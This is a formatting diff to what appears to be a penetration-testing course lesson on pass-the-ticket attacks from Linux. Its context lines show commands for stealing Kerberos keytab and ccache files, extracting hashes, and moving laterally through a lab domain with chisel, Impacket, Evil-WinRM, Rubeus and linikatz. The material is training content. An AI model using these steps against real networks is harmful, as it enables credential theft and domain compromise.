@@ -29,7 +29,7 @@
 
 #### Linux Auth via Port Forward
 
-```shell-session
+``` shell-session
 [!bash!]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
 
 david@inlanefreight.htb@10.129.204.23's password: 
@@ -66,7 +66,7 @@ david@inlanefreight.htb@linux01:~$
 
 #### realm - Check If Linux Machine is Domain Joined
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ realm list
 
 inlanefreight.htb
@@ -90,7 +90,7 @@ inlanefreight.htb
 
 #### PS - Check if Linux Machine is Domain Joined
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
 
 root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
@@ -105,7 +105,7 @@ root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam -
 
 #### Using Find to Search for Files with Keytab in the Name
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
 
 <SNIP>
@@ -116,7 +116,7 @@ david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
 
 #### Identifying Keytab Files in Cronjobs
 
-```shell-session
+``` shell-session
 carlos@inlanefreight.htb@linux01:~$ crontab -l
 
 # Edit this file to introduce tasks to be run by cron.
@@ -136,7 +136,7 @@ smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home
 
 #### Reviewing Environment Variables for ccache Files.
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ env | grep -i krb5
 
 KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
@@ -144,7 +144,7 @@ KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
 
 #### Searching for ccache Files in /tmp
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ ls -la /tmp
 
 total 68
@@ -159,7 +159,7 @@ drwxr-xr-x 20 root                     root                           4096 Oct  
 
 #### Listing keytab File Information
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ klist -k -t 
 
 /opt/specialfiles/carlos.keytab 
@@ -171,7 +171,7 @@ KVNO Timestamp           Principal
 
 #### Impersonating a User with a keytab
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ klist 
 
 Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
@@ -192,7 +192,7 @@ Valid starting     Expires            Service principal
 
 #### Connecting to SMB Share as Carlos
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
 
   .                                   D        0  Thu Oct  6 14:46:26 2022
@@ -206,7 +206,7 @@ david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
 
 #### Extracting Keytab Hashes with KeyTabExtract
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
 
 [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
@@ -224,7 +224,7 @@ david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfil
 
 #### Log in as Carlos
 
-```shell-session
+``` shell-session
 david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
 
 Password: 
@@ -243,7 +243,7 @@ Valid starting       Expires              Service principal
 
 #### Privilege Escalation to Root
 
-```shell-session
+``` shell-session
 [!bash!]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                   
 svc_workstations@inlanefreight.htb@10.129.204.23's password: 
@@ -264,7 +264,7 @@ root
 
 #### Looking for ccache Files
 
-```shell-session
+``` shell-session
 root@linux01:~# ls -la /tmp
 
 total 76
@@ -280,7 +280,7 @@ drwxr-xr-x 20 root                               root                           
 
 #### Identifying Group Membership with the id Command
 
-```shell-session
+``` shell-session
 root@linux01:~# id julio@inlanefreight.htb
 
 uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
@@ -288,7 +288,7 @@ uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.
 
 #### Importing the ccache File into our Current Session
 
-```shell-session
+``` shell-session
 root@linux01:~# klist
 
 klist: No credentials cache found (filename: /tmp/krb5cc_0)
@@ -325,7 +325,7 @@ root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
 
 #### Host File Modified
 
-```shell-session
+``` shell-session
 [!bash!]$ cat /etc/hosts
 
 # Host addresses
@@ -336,7 +336,7 @@ root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
 
 #### Proxychains Configuration File
 
-```shell-session
+``` shell-session
 [!bash!]$ cat /etc/proxychains.conf
 
 <SNIP>
@@ -347,7 +347,7 @@ socks5 127.0.0.1 1080
 
 #### Download Chisel to our Attack Host
 
-```shell-session
+``` shell-session
 [!bash!]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
 [!bash!]$ gzip -d chisel_1.7.7_linux_amd64.gz
 [!bash!]$ mv chisel_* chisel && chmod +x ./chisel
@@ -360,13 +360,13 @@ socks5 127.0.0.1 1080
 
 #### Connect to MS01 with xfreerdp
 
-```shell-session
+``` shell-session
 [!bash!]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
 ```
 
 #### Execute chisel from MS01
 
-```cmd-session
+``` cmd-session
 C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 
 2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
@@ -375,7 +375,7 @@ C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 
 #### Setting the KRB5CCNAME Environment Variable
 
-```shell-session
+``` shell-session
 [!bash!]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
 
@@ -383,7 +383,7 @@ C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 
 #### Using Impacket with proxychains and Kerberos Authentication
 
-```shell-session
+``` shell-session
 [!bash!]$ proxychains impacket-wmiexec dc01 -k
 
 [proxychains] config file found: /etc/proxychains.conf
@@ -408,7 +408,7 @@ inlanefreight\julio
 
 #### Installing Kerberos Authentication Package
 
-```shell-session
+``` shell-session
 [!bash!]$ sudo apt-get install krb5-user -y
 
 Reading package lists... Done                                                                                                  
@@ -428,7 +428,7 @@ Reading state information... Done
 
 #### Kerberos Configuration File for INLANEFREIGHT.HTB
 
-```shell-session
+``` shell-session
 [!bash!]$ cat /etc/krb5.conf
 
 [libdefaults]
@@ -446,7 +446,7 @@ Reading state information... Done
 
 #### Using Evil-WinRM with Kerberos
 
-```shell-session
+``` shell-session
 [!bash!]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
 
 [proxychains] config file found: /etc/proxychains.conf
@@ -471,7 +471,7 @@ DC01
 
 #### Impacket Ticket Converter
 
-```shell-session
+``` shell-session
 [!bash!]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -482,7 +482,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 #### Importing Converted Ticket into Windows Session with Rubeus
 
-```cmd-session
+``` cmd-session
 C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 
    ______        _
@@ -531,7 +531,7 @@ C:\htb>dir \\dc01\julio
 
 #### Linikatz Download and Execution
 
-```shell-session
+``` shell-session
 [!bash!]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 [!bash!]$ /opt/linikatz.sh
  _ _       _ _         _
